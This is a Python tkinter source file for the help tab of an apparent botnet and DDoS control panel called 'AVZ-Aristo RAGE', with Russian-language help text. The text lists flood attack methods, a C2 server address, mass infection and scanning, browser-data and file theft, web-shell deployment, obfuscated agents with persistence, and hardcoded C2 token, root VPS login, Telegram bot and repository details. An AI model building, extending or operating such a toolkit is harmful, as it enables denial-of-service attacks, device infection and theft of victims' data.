import tkinter as tk
from tkinter import ttk, scrolledtext
import json, os

class HelpTab(ttk.Frame):
    def __init__(self, parent, app):
        super().__init__(parent)
        self.app = app
        version = "unknown"
        if os.path.exists("version.json"):
            with open("version.json") as f:
                version = json.load(f).get("version", "unknown")
        self.create_widgets(version)

    def create_widgets(self, version):
        text = scrolledtext.ScrolledText(self, wrap=tk.WORD, bg='#ffffff', fg='#000000',
                                         font=('Consolas', 10))
        text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        content = f"""
╔══════════════════════════════════════════════════════════════╗
║                AVZ-Aristo RAGE v{version:<21} ║
╠══════════════════════════════════════════════════════════════╣
║ Методы атаки (вкладка "Атака"):                             ║
║   GET, POST, CFB, CFBUAM, RAPID, TCP, UDP, SYN_FLOOD       ║
║   Гибридный режим (L7 + L4 одновременно)                   ║
║   Берсерк-ротация User-Agent / JA3 / метода                ║
║   Умный флуд (парсинг HTML цели)                           ║
╠══════════════════════════════════════════════════════════════╣
║ Ботнет (вкладка "Ботнет"):                                  ║
║   Подключение к C2 (80.249.146.202:80)                     ║
║   Таблица ботов с типами устройств (сервер, ПК, роутер)    ║
║   Сортировка, фильтр (все/онлайн/офлайн)                   ║
║   Массовая атака всеми ботами                              ║
║   Загрузка целей из файла                                  ║
║   Встроенный масс‑сканер (гарантированные IP)               ║
║   Обновление VPS через GitHub                              ║
║   Прогресс‑бар заражения                                   ║
╠══════════════════════════════════════════════════════════════╣
║ Захват данных (вкладка "Захват"):                          ║
║   grab_common_files, grab_browser_data, deploy_web_shell    ║
║   Результаты сохраняются в папку loot/                      ║
╠══════════════════════════════════════════════════════════════╣
║ Разведка (вкладка "Разведка"):                              ║
║   WHOIS, DNS, HTTP-заголовки, SSL, технологии,              ║
║   поддомены, сканирование портов                           ║
║   Wappalyzer (опционально)                                 ║
╠══════════════════════════════════════════════════════════════╣
║ Диагностика (вкладка "Диагностика"):                        ║
║   Проверка VPS (порты, процессы, зависимости)              ║
║   Автоисправление (systemd сервисы)                        ║
║   Python-консоль для быстрых проверок                      ║
║   Анализ кода (синтаксис, пропущенные методы, импорты)    ║
║   Создание новых вкладок (генератор)                       ║
║   Лог спредера (последние 30 строк)                        ║
╠══════════════════════════════════════════════════════════════╣
║ Агенты:                                                     ║
║   Python-агент (кросс-платформенный, XOR-обфускация)      ║
║   Bash-агент (curl/wget)                                   ║
║   Автозагрузка (cron/systemd/реестр)                       ║
╠══════════════════════════════════════════════════════════════╣
║ Горячие клавиши:                                            ║
║   Ctrl+C / Ctrl+V – копирование и вставка везде            ║
║   Правый клик → контекстное меню                           ║
╠══════════════════════════════════════════════════════════════╣
║ Зависимости:                                                ║
║   pip install requests scapy aiohttp httpx curl_cffi        ║
║   python-Wappalyzer beautifulsoup4 psutil paramiko          ║
║   redis docker asyncssh pymssql mysql-connector-python      ║
║   psycopg2-binary impacket pywinrm vncdotool                ║
╠══════════════════════════════════════════════════════════════╣
║ Токен C2: AVZ-ARISTO-SECRET-KEY-2025                        ║
║ VPS: root@80.249.146.202 (порт 80/443)                     ║
║ Telegram бот: @AristoAVZ_bot (ID 2119367196)                ║
║ Репозиторий: https://github.com/Aristocrat702/avz          ║
╚══════════════════════════════════════════════════════════════╝
"""
        text.insert(tk.END, content)
        text.config(state='disabled')
